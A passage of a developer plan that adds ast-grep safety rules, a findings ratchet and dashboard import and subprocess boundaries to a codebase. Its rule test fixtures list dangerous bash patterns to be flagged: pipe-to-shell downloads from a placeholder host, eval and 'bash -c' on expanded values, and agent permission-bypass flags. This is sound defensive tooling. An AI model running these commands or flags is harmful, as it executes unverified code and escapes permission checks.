export function grown(current: Counts, baseline: Counts): [...Entry, number | undefined][] {
  return entries(current)
    .map(([rule, file, n]): [...Entry, number | undefined] => [
      rule,
      file,
      n,
      baseline[rule]?.[file],
    ])
    .filter(([, , n, base]) => base === undefined || n > base);
}

/** The baseline is a ratchet: counts may only go down, and every entry must match reality. */
export function checkFindings(current: Counts, baseline: Counts): string[] {
  const growth = grown(current, baseline).map(([rule, file, n, base]) =>
    base === undefined
      ? `${rule} ${file}: ${n} new finding(s). Fix them: baselined findings may only go down.`
      : `${rule} ${file}: ${n} findings (baseline ${base}). Fix the new one: baselined findings may only go down.`,
  );
  const loose = entries(current)
    .filter(([rule, file, n]) => n < (baseline[rule]?.[file] ?? 0))
    .map(([rule, file, n]) => `tighten baseline ${rule} ${file} to ${n}`);
  const stale = entries(baseline)
    .filter(([rule, file]) => !current[rule]?.[file])
    .map(([rule, file]) => `remove baseline entry ${rule} ${file} (no findings left)`);
  return [...growth, ...loose, ...stale];
}

/** Seeds a rule the baseline does not know yet; for known rules it may only tighten or prune. */
export function nextFindingsBaseline(
  current: Counts,
  existing: Counts | undefined,
): { baseline: Counts } | { errors: string[] } {
  const errors: string[] = [];
  for (const [rule, file, n] of entries(current)) {
    const known = existing?.[rule];
    const base = known?.[file];
    if (known && base === undefined) {
      errors.push(`refusing to baseline new finding ${rule} ${file} (${n})`);
    } else if (base !== undefined && n > base) {
      errors.push(`refusing to raise baseline ${rule} ${file} from ${base} to ${n}`);
    }
  }
  return errors.length > 0 ? { errors } : { baseline: sorted(current) };
}

async function scan(): Promise<{ findings: Finding[]; messages: Map<string, string> }> {
  const rules = (await loadRules()).filter(isRatcheted);
  const ids = rules.map((r) => r.id);
  const proc = Bun.spawn(
    [
      join(ROOT, "node_modules/.bin/ast-grep"),
      "scan",
      ...ids.map((id) => `--error=${id}`),
      "--filter",
      `^(${ids.join("|")})$`,
      "--json=stream",
      ...SCAN_PATHS,
    ],
    { cwd: ROOT, stdout: "pipe", stderr: "pipe" },
  );
  const [stdout, stderr, code] = await Promise.all([
    new Response(proc.stdout).text(),
    new Response(proc.stderr).text(),
    proc.exited,
  ]);
  const findings = parseScan(stdout);
  // ast-grep exits 1 when it reports error-severity matches; with no matches, 1 means it failed.
  if (code !== 0 && findings.length === 0) throw new Error(`ast-grep scan failed:\n${stderr}`);
  return { findings, messages: new Map(rules.map((r) => [r.id, r.message ?? ""])) };
}

function report(
  findings: readonly Finding[],
  current: Counts,
  baseline: Counts,
  messages: Map<string, string>,
): number {
  const problems = checkFindings(current, baseline);
  for (const p of problems) console.error(`RATCHET ${p}`);
  for (const [rule, file] of grown(current, baseline)) {
    console.error(`\n${rule}: ${messages.get(rule)}`);
    for (const f of findings.filter((x) => x.ruleId === rule && x.file === file)) {
      console.error(`  ${f.file}:${f.line}`);
    }
  }
  if (problems.length > 0) {
    console.error(
      "\nBaseline: tools/arch/findings-baseline.json. After fixing, run: bun tools/arch/findings-ratchet.ts --write-baseline",
    );
  }
  return problems.length ? 1 : 0;
}

if (import.meta.main) {
  const { findings, messages } = await scan();
  const current = countFindings(findings);
  const file = Bun.file(BASELINE);
  const existing = (await file.exists()) ? ((await file.json()) as Counts) : undefined;
  if (!Bun.argv.includes("--write-baseline")) {
    process.exit(report(findings, current, existing ?? {}, messages));
  }
  const next = nextFindingsBaseline(current, existing);
  if ("errors" in next) {
    for (const e of next.errors) console.error(`RATCHET ${e}`);
    process.exit(1);
  }
  await Bun.write(BASELINE, `${JSON.stringify(next.baseline, null, 2)}\n`);
}
```

```bash
bun run format > /dev/null; bun test tools/arch/findings-ratchet.test.ts 2>&1 | grep -E '^\s*[0-9]+ (pass|fail)'
```

Expected: `6 pass`, `0 fail`.

- [ ] **Step 4: Register the util rules and parse `scripts/sw` as Bash**

`sgconfig.yml`:

```yaml
ruleDirs:
  - tools/arch/rules
utilDirs:
  - tools/arch/utils
testConfigs:
  - testDir: tools/arch/rule-tests
# scripts/sw (the router) has no extension. Globs match the file name.
languageGlobs:
  bash: ["sw"]
```

(`languageGlobs` matches the file name: `"scripts/sw"` matched nothing in the dry run, `"sw"` matched the router.)

`tools/arch/utils/bash-expansion.yml`:

```yaml
# A bash node that is, or contains, a parameter expansion or a command substitution.
id: bash-expansion
language: Bash
rule:
  any:
    - kind: simple_expansion
    - kind: expansion
    - kind: command_substitution
    - has:
        stopBy: end
        any:
          - kind: simple_expansion
          - kind: expansion
          - kind: command_substitution
```

`tools/arch/utils/bash-shell.yml`:

```yaml
# A word naming a POSIX-style shell: sh, bash, zsh, dash or ksh, optionally under /bin or /usr/bin.
id: bash-shell
language: Bash
rule:
  regex: '^(/usr)?(/bin/)?(ba|z|da|k)?sh$'
```

`tools/arch/utils/bash-text.yml`:

```yaml
# A bash node holding literal text: words, strings, heredoc bodies (comments are another kind).
# Rules match the innermost one: `matches: bash-text`, a `regex`, and `not: { has: { regex } }`.
id: bash-text
language: Bash
rule:
  any:
    - kind: heredoc_body
    - kind: raw_string
    - kind: ansi_c_string
    - kind: string
    - kind: string_content
    - kind: word
    - kind: concatenation
    - kind: ERROR
```

- [ ] **Step 5: Write the six rules and their tests**

`tools/arch/rule-tests/f11-bash-no-eval-expansion-test.yml`:

```yaml
id: F11-bash-no-eval-expansion
valid:
  - "eval 'set -- a b'"
  - 'eval "echo hi"'
  - 'evaluate "$x"'
  - 'echo "eval $x"'
  - 'yq eval -o=json "$file"'
invalid:
  - 'eval "$cmd"'
  - 'eval $cmd'
  - 'eval echo "$x"'
  - 'eval "${mutations[$i]} \"$copy\""'
  - 'eval "$(ssh-agent -s)"'
  - 'eval "_v=\"\${${name}}\""'
  - "eval 'v=\"${'\"$key\"':-}\"'"
  - 'if eval "$condition"; then :; fi'
  - 'out=$(eval "$TEST_CMD" 2>&1)'
```

`tools/arch/rules/f11-bash-no-eval-expansion.yml`:

```yaml
# F11 (bash safety): `eval` re-parses its arguments as shell code, so any expansion in them runs
# whatever the value contains. Ratcheted (tools/arch/findings-ratchet.ts).
id: F11-bash-no-eval-expansion
language: Bash
severity: off
metadata: { ratchet: true }
message: "F11: eval re-parses its arguments as code. Call the command directly with quoted \"$args\", use an array (\"${cmd[@]}\"), or printf -v / declare for indirect assignment."
files:
  - "scripts/**/*.sh"
  - "scripts/sw"
# `has` takes no `field: argument` in these rules: a repeated field resolves to its first child only.
rule:
  kind: command
  all:
    - has: { field: name, regex: '^eval$' }
    - has: { matches: bash-expansion }
```

`tools/arch/rule-tests/f11-bash-no-shell-c-expansion-test.yml`:

```yaml
id: F11-bash-no-shell-c-expansion
valid:
  - "bash -c 'echo hi'"
  - "bash -c 'run \"$1\"' _ \"$value\""
  - 'bash "$script" "$arg"'
  - 'bash -n "$file"'
  - 'echo "bash -c $x"'
  - "sh -c 'exit 0'"
invalid:
  - 'bash -c "$handler_cmd"'
  - 'sh -c "echo $y"'
  - 'bash -c $cmd'
  - 'out=$(bash -c "source \"$SCRIPT_DIR/lib.sh\"; f")'
  - 'timeout "$t" bash -c "$command_str"'
  - 'zsh -lc "$cmd"'
  - '/bin/sh -c "$(cat "$f")"'
  - 'bash -ec "${steps[$i]}"'
```

`tools/arch/rules/f11-bash-no-shell-c-expansion.yml`:

```yaml
# F11 (bash safety): `bash -c "$cmd"` parses the expanded value as shell code. Also caught after a
# wrapper (`timeout 30 bash -c "$cmd"`). A literal script with positional arguments is fine:
# `bash -c 'run "$1"' _ "$value"`. Ratcheted (tools/arch/findings-ratchet.ts).
id: F11-bash-no-shell-c-expansion
language: Bash
severity: off
metadata: { ratchet: true }
message: "F11: a shell -c string with an expansion runs the value as code. Run the command directly, or keep the script literal in single quotes and pass values as arguments: bash -c 'cmd \"$1\"' _ \"$value\"."
files:
  - "scripts/**/*.sh"
  - "scripts/sw"
rule:
  kind: command
  has:
    matches: bash-shell
    precedes:
      stopBy: end
      kind: word
      regex: '^-[A-Za-z]*c[A-Za-z]*$'
      precedes: { matches: bash-expansion }
```

`tools/arch/rule-tests/f11-bash-no-pipe-to-shell-test.yml`:

```yaml
id: F11-bash-no-pipe-to-shell
valid:
  - 'curl -fsSL "$url" -o "$tmp/install.sh"'
  - 'echo "Install: curl -fsSL https://bun.sh/install | bash"'
  - 'curl -s "$api" | jq -r .name'
  - 'bash "$tmp/install.sh"'
invalid:
  - 'curl -fsSL https://bun.sh/install | bash'
  - 'if curl -fsSL --max-time 120 https://bun.sh/install | bash 2>/dev/null; then :; fi'
  - 'wget -qO- https://x.example/i.sh | sh'
  - 'curl -sL "$u" | sudo bash -s -- --yes'
  - 'bash <(curl -fsSL https://x.example/i.sh)'
  - 'sh -c "$(curl -fsSL https://x.example/i.sh)"'
```

`tools/arch/rules/f11-bash-no-pipe-to-shell.yml`:

```yaml
# F11 (bash safety): piping a download into a shell runs unpinned, unverified code.
# Ratcheted (tools/arch/findings-ratchet.ts).
id: F11-bash-no-pipe-to-shell
language: Bash
severity: off
metadata: { ratchet: true }
message: "F11: never pipe a download into a shell. Download to a file, verify a pinned checksum (shasum -a 256 -c), then run it; or print the install command for the user instead of running it."
files:
  - "scripts/**/*.sh"
  - "scripts/sw"
utils:
  download:
    kind: command
    has: { field: name, regex: '^(curl|wget)$' }
rule:
  any:
    # curl … | bash, wget … | sudo sh
    - kind: pipeline
      all:
        - has: { matches: download }
        - has:
            kind: command
            any:
              - has: { field: name, matches: bash-shell }
              - all:
                  - has: { field: name, regex: '^sudo$' }
                  - has: { matches: bash-shell }
    # bash <(curl …), sh -c "$(curl …)"
    - kind: command
      all:
        - has: { field: name, matches: bash-shell }
        - has:
            stopBy: end
            any:
              - kind: process_substitution
              - kind: command_substitution
            has: { stopBy: end, matches: download }
```

`tools/arch/rule-tests/f11-bash-no-gha-expression-test.yml`:

```yaml
id: F11-bash-no-gha-expression
valid:
  - 'echo "${HOME}"'
  - 'echo "${x:-{}}"'
  - '# never write ${{ github.event.issue.title }} in a run step'
  - 'echo "$TITLE"'
invalid:
  - 'echo "${{ github.event.issue.title }}"'
  - "echo '${{ secrets.TOKEN }}'"
  - |
    cat > "$wf" <<EOF
          - run: echo \${{ matrix.os }}
    EOF
  - |
    cat > "$wf" <<'EOF'
        key: ${{ runner.os }}-node
    EOF
  - 'printf "%s\n" "runs-on: \${{ matrix.os }}"'
```

`tools/arch/rules/f11-bash-no-gha-expression.yml`:

```yaml
# F11 (bash safety): a GitHub Actions expression is substituted into the text before any shell
# parses it, so a script, or a workflow it generates, must never contain one (#8533). Comments are
# ignored. Ratcheted (tools/arch/findings-ratchet.ts).
id: F11-bash-no-gha-expression
language: Bash
severity: off
metadata: { ratchet: true }
message: "F11: no ${{ }} expression in scripts or in workflow text they generate. Pass the value through the step's env: block and read \"$VAR\" (tools/arch/workflow-injection.ts checks workflows)."
files:
  - "scripts/**/*.sh"
  - "scripts/sw"
rule:
  matches: bash-text
  regex: '\$\{\{'
  not: { has: { regex: '\$\{\{' } }
```

`tools/arch/rule-tests/f9-bash-no-permission-bypass-test.yml`:

```yaml
id: F9-bash-no-permission-bypass
valid:
  - 'claude -p "$prompt" --allowedTools "Read,Edit" --permission-mode dontAsk'
  - '# never pass --dangerously-skip-permissions'
invalid:
  - 'claude -p "$prompt" --dangerously-skip-permissions'
  - 'flags+=(--dangerously-skip-permissions)'
  - 'CLAUDE_FLAGS="--model $m --dangerously-skip-permissions"'
  - 'claude --permission-mode bypassPermissions -p "$p"'
```

`tools/arch/rules/f9-bash-no-permission-bypass.yml`:

```yaml
# F9 for bash: agents never run with permission checks disabled. Ratcheted until each caller is
# ported to the AgentRunner port (permissionMode "dontAsk" and a per-stage tool allowlist).
id: F9-bash-no-permission-bypass
language: Bash
severity: off
metadata: { ratchet: true }
message: "F9: agents never skip permission checks. Pass an explicit --allowedTools list (and --permission-mode dontAsk) instead of --dangerously-skip-permissions or bypassPermissions."
files:
  - "scripts/**/*.sh"
  - "scripts/sw"
rule:
  matches: bash-text
  regex: 'dangerously-skip-permissions|bypassPermissions|allowDangerouslySkipPermissions'
  not: { has: { regex: 'dangerously-skip-permissions|bypassPermissions|allowDangerouslySkipPermissions' } }
```

`tools/arch/rule-tests/f10-bash-github-writes-test.yml`:

```yaml
id: F10-bash-github-writes
valid:
  - 'gh issue view "$n" --json title'
  - 'gh pr list --state open --json number'
  - 'gh api "repos/$repo/issues/$n/comments" --paginate'
  - 'gh api "repos/$repo/pulls" -X GET'
  - 'gh run list --workflow ci.yml'
  - 'echo "gh issue create"'
  - 'git commit -m "gh pr merge"'
invalid:
  - 'gh issue create --title "$t" --body "$b"'
  - 'gh issue comment "$n" --body "$msg"'
  - 'gh pr merge "$pr" --squash'
  - 'gh pr create --fill'
  - 'gh label create "$l" --color ff0000'
  - 'gh workflow run ci.yml'
  - 'gh run rerun "$id"'
  - 'gh api "repos/$repo/issues/$n/labels" -X POST -f "labels[]=x"'
  - 'gh api --method PATCH "repos/$repo/issues/comments/$id" -f body="$b"'
  - 'gh api "repos/$repo/issues" -f title="$t"'
  - 'url=$(gh pr create --title "$t" --body-file "$f")'
  - 'timeout 30 gh issue close "$n"'
  - 'gh issue edit "$n" --add-label "$l" 2>/dev/null || true'
```

`tools/arch/rules/f10-bash-github-writes.yml`:

```yaml
# F10 for bash: GitHub writes move into GithubWriter as each command is ported. Ratcheted: a script
# may lose `gh` write calls but never gain one (tools/arch/findings-ratchet.ts). Matches a `gh`
# command (or a wrapper such as `timeout 30 gh …`) with a write subcommand, and `gh api` calls that
# set a write method or send a body. The verb lists mirror f10-github-writes-only-in-writer.yml.
id: F10-bash-github-writes
language: Bash
severity: off
metadata: { ratchet: true }
message: "F10: no new GitHub writes from bash. Port the caller and add an idempotent GithubWriter method (src/adapters/github/gh-github-writer.ts), or call an existing writer."
files:
  - "scripts/**/*.sh"
  - "scripts/sw"
rule:
  kind: command
  all:
    - has: { regex: '^gh$' }
    - any:
        - all:
            - has: { regex: '^["'']?(issue|pr)["'']?$' }
            - has: { regex: '^["'']?(create|edit|comment|close|reopen|merge|review|lock|unlock|pin|unpin|develop|delete|transfer|ready|update-branch|revert)["'']?$' }
        - all:
            - has: { regex: '^["'']?(label|release)["'']?$' }
            - has: { regex: '^["'']?(create|edit|delete|clone|upload|delete-asset)["'']?$' }
        - all:
            - has: { regex: '^["'']?workflow["'']?$' }
            - has: { regex: '^["'']?(run|enable|disable)["'']?$' }
        - all:
            - has: { regex: '^["'']?run["'']?$' }
            - has: { regex: '^["'']?(rerun|cancel|delete)["'']?$' }
        - all:
            - has: { regex: '^["'']?(secret|variable)["'']?$' }
            - has: { regex: '^["'']?(set|delete|remove)["'']?$' }
        - all:
            - has: { regex: '^["'']?api["'']?$' }
            - any:
                - has:
                    regex: '^["'']?(-X|--method)["'']?$'
                    precedes: { regex: '^["'']?(?i:POST|PATCH|PUT|DELETE)["'']?$' }
                - has: { regex: '^["'']?(-X=?|--method=)(?i:POST|PATCH|PUT|DELETE)["'']?$' }
                - has: { regex: '^["'']?(-[fF]|--field|--raw-field|--input)(=.*)?' }
```

```bash
./node_modules/.bin/ast-grep test --skip-snapshot-tests 2>&1 | grep result
./node_modules/.bin/ast-grep test --skip-snapshot-tests --include-off 2>&1 | grep -E 'bash|result'
./node_modules/.bin/ast-grep scan > /dev/null 2>&1; echo "scan exit=$?"
bun test tools/arch/meta.test.ts 2>&1 | grep -E '^\s*[0-9]+ (pass|fail)'
```

Expected: without `--include-off`, `test result: ok. 7 passed; 0 failed;` (the off rules are skipped, which is why Step 7 adds the flag). With it, a `PASS` line for each of the six bash rules and `test result: ok. 13 passed; 0 failed;`. `scan exit=0` (off rules do not fail the scan). Meta: `41 pass`, `0 fail`.

- [ ] **Step 6: The ratchet fails without a baseline, then seed it against the current HEAD**

```bash
bun tools/arch/findings-ratchet.ts 2>&1 | head -2; bun tools/arch/findings-ratchet.ts > /dev/null 2>&1; echo "exit=$?"
bun tools/arch/findings-ratchet.ts --write-baseline && bun tools/arch/findings-ratchet.ts; echo "exit=$?"
jq -r 'to_entries[] | "\(.key): \(.value | length) files, \([.value[]] | add) findings"' tools/arch/findings-baseline.json
```

Expected: `RATCHET F10-bash-github-writes scripts/lib/daemon-dispatch.sh: 6 new finding(s). Fix them: baselined findings may only go down.` and `exit=1`; after seeding, `exit=0`. On the dry run at `afb5f2647`:

```text
F10-bash-github-writes: 31 files, 81 findings
F11-bash-no-eval-expansion: 11 files, 16 findings
F11-bash-no-gha-expression: 1 files, 12 findings
F11-bash-no-pipe-to-shell: 1 files, 1 findings
F11-bash-no-shell-c-expansion: 21 files, 72 findings
F9-bash-no-permission-bypass: 7 files, 16 findings
```

Commits after `afb5f2647` that touch `scripts/` can shift these counts; whatever the seed records at execution time is the baseline. Spot-check that the findings are real (the dry run's were: `sw-evidence.sh` `bash -c "$command_str"`, `sw-loop.sh` `eval "$TEST_CMD"`, `sw-init.sh` `curl … | bash`, `sw-ci.sh` generating `${{ matrix.os }}`, `loop-iteration.sh` `--dangerously-skip-permissions`, `daemon-failure.sh` `gh issue edit`):

```bash
./node_modules/.bin/ast-grep scan --error=F11-bash-no-eval-expansion --filter '^F11-bash-no-eval-expansion$' --json=stream scripts 2>/dev/null \
  | jq -r '.file + ":" + (.range.start.line + 1 | tostring) + "  " + (.lines | .[0:70])'
```

- [ ] **Step 7: Wire it into `bun run arch`**

In `package.json`'s `arch` script, replace `ast-grep test --skip-snapshot-tests &&` with `ast-grep test --skip-snapshot-tests --include-off &&`, and append ` && bun tools/arch/findings-ratchet.ts` at the end. The line becomes:

```json
    "arch": "depcruise src --config .dependency-cruiser.cjs && ast-grep scan && ast-grep test --skip-snapshot-tests --include-off && bun tools/arch/size-ratchet.ts && bun tools/arch/workflow-injection.ts && bun tools/arch/workflow-fail-closed.ts && bun tools/arch/findings-ratchet.ts",
```

- [ ] **Step 8: Prove growth fails, with the fix in the message**

```bash
printf 'eval "$1"\n' >> scripts/lib/compat.sh
bun run arch 2>&1 | grep -A3 '^RATCHET'; bun run arch > /dev/null 2>&1; echo "exit=$?"
git checkout -- scripts/lib/compat.sh
```

Expected: `RATCHET F11-bash-no-eval-expansion scripts/lib/compat.sh: 3 findings (baseline 2). Fix the new one: baselined findings may only go down.`, then the rule's message and the `scripts/lib/compat.sh:<line>` locations; `exit=1`.

- [ ] **Step 9: Run the definition of done**

```bash
bun run format && git add sgconfig.yml package.json tools/arch/findings-ratchet.ts tools/arch/findings-ratchet.test.ts \
  tools/arch/findings-baseline.json tools/arch/utils tools/arch/rules/f11-bash-*.yml tools/arch/rule-tests/f11-bash-*.yml \
  tools/arch/rules/f9-bash-no-permission-bypass.yml tools/arch/rule-tests/f9-bash-no-permission-bypass-test.yml \
  tools/arch/rules/f10-bash-github-writes.yml tools/arch/rule-tests/f10-bash-github-writes-test.yml && bun run check
```

Expected: passes; the last lines are `✓ parity hello` and `1/1 parity suites passed`.

- [ ] **Step 10: Commit**

```bash
git commit -m "feat(arch): bash fitness rules F9/F10/F11 with a findings ratchet" -- \
  sgconfig.yml package.json tools/arch/findings-ratchet.ts tools/arch/findings-ratchet.test.ts \
  tools/arch/findings-baseline.json tools/arch/utils tools/arch/rules/f11-bash-*.yml tools/arch/rule-tests/f11-bash-*.yml \
  tools/arch/rules/f9-bash-no-permission-bypass.yml tools/arch/rule-tests/f9-bash-no-permission-bypass-test.yml \
  tools/arch/rules/f10-bash-github-writes.yml tools/arch/rule-tests/f10-bash-github-writes-test.yml
```

---

### Task 5: F12 dashboard boundaries

**Files:**
- Create: `.dependency-cruiser.dashboard.cjs`, `tools/arch/rules/dashboard-subprocess-only-in-services.yml`, `tools/arch/rule-tests/dashboard-subprocess-only-in-services-test.yml`
- Modify: `package.json`, `tools/arch/findings-baseline.json`

Inventory at `afb5f2647`: `dashboard/` has a browser bundle (`src/`, built for the browser) and a Bun server: `server.ts` (5.9k lines) → `routes/auth.ts` → `middleware/{auth,constants}.ts`; `services/{claims,subprocess-guards,db,config}.ts`; `types/`. Today's imports already follow the layering, so D1–D4 are strict. Processes are spawned by `services/claims.ts` (`execFileSync` with argv) and by `server.ts` (the `child_process` import and 13 `execSync`/`execFileSync` calls), so the subprocess allowlist is a ratchet. Wave 1a Task 15's `dashboard-no-shell-from-data` already forbids non-constant or concatenated shell strings and `shell: true`; this task does not repeat it.

- [ ] **Step 1: Write the dashboard dependency-cruiser config**

`.dependency-cruiser.dashboard.cjs`:

```js
/**
 * Dashboard boundaries (D1–D4, spec §3.3). The dashboard is a separate TypeScript project until it
 * is ported (Wave 3): server.ts (routing) → routes/ → middleware/ and services/ → types/; the
 * browser bundle in dashboard/src talks to the server only over HTTP. Messages tell agents the fix.
 */
const SERVER = "^dashboard/(server\\.ts|routes|services|middleware|types)(/|$)";
module.exports = {
  forbidden: [
    {
      name: "D1-browser-server-split",
      comment:
        "D1: dashboard/src is the browser bundle and the server side is Bun. Neither imports the other: talk over HTTP, and keep browser wire types in dashboard/src/types/api.ts.",
      severity: "error",
      from: { path: "^dashboard/src/" },
      to: { path: SERVER },
    },
    {
      name: "D1-server-browser-split",
      comment:
        "D1: the server must not import the browser bundle (dashboard/src). Move shared logic into dashboard/services.",
      severity: "error",
      from: { path: SERVER },
      to: { path: "^dashboard/src/" },
    },
    {
      name: "D2-services-are-the-bottom-layer",
      comment:
        "D2: services/ and types/ never import routes/, middleware/ or server.ts. Pass what the service needs as parameters.",
      severity: "error",
      from: { path: "^dashboard/(services|types)/" },
      to: { path: "^dashboard/(routes|middleware|server\\.ts)" },
    },
    {
      name: "D2-middleware-not-routes",
      comment:
        "D2: middleware/ never imports routes/ or server.ts. Move the shared piece into middleware/ or services/.",
      severity: "error",
      from: { path: "^dashboard/middleware/" },
      to: { path: "^dashboard/(routes|server\\.ts)" },
    },
    {
      name: "D3-routes-not-server",
      comment:
        "D3: routes/ never imports server.ts or another route. Move the shared piece into services/ or middleware/.",
      severity: "error",
      from: { path: "^dashboard/routes/([^/]+)\\.ts$" },
      to: { path: "^dashboard/(server\\.ts|routes/)", pathNot: "^dashboard/routes/$1\\.ts$" },
    },
    {
      name: "D4-no-cycles",
      comment: "D4: break the cycle by moving the shared piece down into services/ or types/.",
      severity: "error",
      from: { path: "^dashboard/" },
      to: { circular: true },
    },
  ],
  options: {
    doNotFollow: { path: "node_modules" },
    exclude: { path: ["\\.test\\.ts$", "^dashboard/(public|coverage|node_modules)/"] },
    tsPreCompilationDeps: true,
    // With a tsconfig, "./x.js" imports resolve to the .ts sources (TypeScript's rule).
    tsConfig: { fileName: "tsconfig.json" },
  },
};
```

(`tsConfig` is needed so that `import "./services/claims.js"` resolves to `claims.ts`; `enhancedResolveOptions.extensionAlias` is rejected by dependency-cruiser 18.6's schema, and `dashboard/tsconfig.json` includes only `src/`.)

- [ ] **Step 2: Green on the real tree, red on probes**

```bash
./node_modules/.bin/depcruise dashboard --config .dependency-cruiser.dashboard.cjs 2>&1 | tail -1
echo 'import { CORS_HEADERS } from "../middleware/constants.js"; export const x = CORS_HEADERS;' > dashboard/services/zz-probe.ts
echo 'import { SESSION_TTL_MS } from "../middleware/constants"; export const y = SESSION_TTL_MS;' > dashboard/src/zz-probe.ts
echo 'import { x } from "../routes/zz-probe2.js"; export const m = x;' > dashboard/middleware/zz-probe.ts
echo 'import { m } from "./zz-probe3.js"; export const x = m;' > dashboard/routes/zz-probe2.ts
echo 'import { x } from "./zz-probe2.js"; export const m = x;' > dashboard/routes/zz-probe3.ts
./node_modules/.bin/depcruise dashboard --config .dependency-cruiser.dashboard.cjs 2>&1 | grep -E '^\s+error' | sed 's/^ *//' | cut -c1-60
rm dashboard/services/zz-probe.ts dashboard/src/zz-probe.ts dashboard/middleware/zz-probe.ts dashboard/routes/zz-probe2.ts dashboard/routes/zz-probe3.ts
```

Expected: `✔ no dependency violations found (57 modules, 184 dependencies cruised)` (module counts vary with Wave 1a's dashboard changes); then errors for `D4-no-cycles`, `D3-routes-not-server` (twice), `D2-services-are-the-bottom-layer`, `D2-middleware-not-routes` and `D1-browser-server-split`.

- [ ] **Step 3: Write the subprocess allowlist rule test**

`tools/arch/rule-tests/dashboard-subprocess-only-in-services-test.yml`:

```yaml
id: dashboard-subprocess-only-in-services
valid:
  - 'db.exec("PRAGMA journal_mode=WAL;");'
  - 'const r = regex.exec(line);'
  - 'import { join } from "path";'
  - 'import type { ExecFileSyncOptions } from "child_process";'
  - 'const out = await runGh(["issue", "view", String(n)]);'
  - 'particles.spawn(x, y);'
invalid:
  - 'import { execSync } from "child_process";'
  - 'import { spawn } from "node:child_process";'
  - 'const cp = require("child_process");'
  - 'const cp = await import("node:child_process");'
  - 'execSync("nproc");'
  - 'execFileSync("gh", ["issue", "view", String(n)]);'
  - 'const p = spawn("ssh", argv);'
  - 'Bun.spawn(["git", "status"]);'
  - 'await Bun.$`git log`;'
```

- [ ] **Step 4: Write the rule**

`tools/arch/rules/dashboard-subprocess-only-in-services.yml`:

```yaml
# Dashboard: only allowlisted services spawn processes, so validation and argv building live in one
# place (#8534). Ratcheted (tools/arch/findings-ratchet.ts): server.ts still spawns directly and may
# only lose call sites until Wave 3 ports it. To add a subprocess call, put it in a service that
# validates its inputs and add that file to `ignores` below in a reviewed change.
id: dashboard-subprocess-only-in-services
language: TypeScript
severity: off
metadata: { ratchet: true }
message: "Dashboard: spawn processes only from an allowlisted service (dashboard/services/claims.ts). Move the call into a service that validates its input and passes an argv array, and call that service."
files:
  - "dashboard/**/*.ts"
ignores:
  - "dashboard/**/*.test.ts"
  - "dashboard/src/**"
  - "dashboard/services/claims.ts"
  - "dashboard/services/subprocess-guards.ts"
rule:
  any:
    - all:
        - any:
            - kind: import_statement
            - kind: export_statement
        - has: { field: source, regex: '^["''](node:)?child_process["'']$' }
        - not: { regex: '^(import|export)\s+type\s' }
    - all:
        - any:
            - pattern: require($S)
            - pattern: import($S)
        - has:
            field: arguments
            has: { kind: string, regex: '^["''](node:)?child_process["'']$' }
    - kind: call_expression
      has:
        field: function
        kind: identifier
        regex: '^(exec|execSync|execFile|execFileSync|spawn|spawnSync|fork)$'
    - kind: member_expression
      all:
        - has: { field: object, regex: '^Bun$' }
        - has: { field: property, regex: '^(spawn|spawnSync|\$)$' }
```

```bash
./node_modules/.bin/ast-grep test --skip-snapshot-tests --include-off 2>&1 | grep -E 'subprocess|result'
bun tools/arch/findings-ratchet.ts 2>&1 | grep '^RATCHET'
```

Expected: `PASS dashboard-subprocess-only-in-services  ...............`, `test result: ok. 14 passed; 0 failed;`; the ratchet fails with `RATCHET dashboard-subprocess-only-in-services dashboard/server.ts: 14 new finding(s). …` (the count at execution time is whatever `server.ts` has after Wave 1a Task 15).

- [ ] **Step 5: Seed the new rule's baseline**

The baseline has never seen this rule, so `--write-baseline` seeds it. Every other entry must stay unchanged:

```bash
bun tools/arch/findings-ratchet.ts --write-baseline && bun tools/arch/findings-ratchet.ts; echo "exit=$?"
git diff --stat tools/arch/findings-baseline.json
jq '."dashboard-subprocess-only-in-services"' tools/arch/findings-baseline.json
```

Expected: `exit=0`; the diff adds only the new rule's block (`3 insertions` on the dry run); `{ "dashboard/server.ts": 14 }`.

- [ ] **Step 6: Wire D1–D4 into `bun run arch`**

In `package.json`'s `arch` script, insert `depcruise dashboard --config .dependency-cruiser.dashboard.cjs && ` after `depcruise src --config .dependency-cruiser.cjs && `:

```json
    "arch": "depcruise src --config .dependency-cruiser.cjs && depcruise dashboard --config .dependency-cruiser.dashboard.cjs && ast-grep scan && ast-grep test --skip-snapshot-tests --include-off && bun tools/arch/size-ratchet.ts && bun tools/arch/workflow-injection.ts && bun tools/arch/workflow-fail-closed.ts && bun tools/arch/findings-ratchet.ts",
```

- [ ] **Step 7: Run the definition of done**

```bash
bun run format && git add .dependency-cruiser.dashboard.cjs package.json tools/arch/findings-baseline.json \
  tools/arch/rules/dashboard-subprocess-only-in-services.yml tools/arch/rule-tests/dashboard-subprocess-only-in-services-test.yml && bun run check
```

Expected: passes; the last lines are `✓ parity hello` and `1/1 parity suites passed`.

- [ ] **Step 8: Commit**

```bash
git commit -m "feat(arch): F12 dashboard layering and subprocess allowlist" -- \
  .dependency-cruiser.dashboard.cjs package.json tools/arch/findings-baseline.json \
  tools/arch/rules/dashboard-subprocess-only-in-services.yml tools/arch/rule-tests/dashboard-subprocess-only-in-services-test.yml
```

---

### Task 6: Generated dependency graph

**Files:**
- Create: `tools/docs/gen-dependency-graph.ts`, `tools/docs/gen-dependency-graph.test.ts`, `docs/reference/dependency-graph.md` (generated)
- Modify: `package.json`

- [ ] **Step 1: Write the test**

`tools/docs/gen-dependency-graph.test.ts`:

```ts
import { expect, test } from "bun:test";
import { groupOf, layerEdges, renderGraph } from "./gen-dependency-graph";

test("collapses files into contexts, layers, adapters and entry points", () => {
  expect(groupOf("src/contexts/orchestration/domain/breaker.ts")).toBe("orchestration/domain");
  expect(groupOf("src/contexts/orchestration/application/gates.ts")).toBe(
    "orchestration/application",
  );
  expect(groupOf("src/contexts/orchestration/index.ts")).toBe("orchestration");
  expect(groupOf("src/adapters/github/gh-json.ts")).toBe("adapters/github");
  expect(groupOf("src/adapters/paths.ts")).toBe("adapters");
  expect(groupOf("src/shared/kernel/ports.ts")).toBe("kernel");
  expect(groupOf("src/cli/commands/gates.ts")).toBe("cli");
  expect(groupOf("src/cli.ts")).toBe("cli");
  expect(groupOf("src/main.ts")).toBe("main");
  expect(groupOf("node_modules/zod/index.cjs")).toBeUndefined();
});

test("edges are unique, sorted and never self-loops", () => {
  const modules = [
    {
      source: "src/cli/commands/a.ts",
      dependencies: [{ resolved: "src/contexts/x/index.ts" }, { resolved: "src/cli/shared.ts" }],
    },
    { source: "src/cli/commands/b.ts", dependencies: [{ resolved: "src/contexts/x/index.ts" }] },
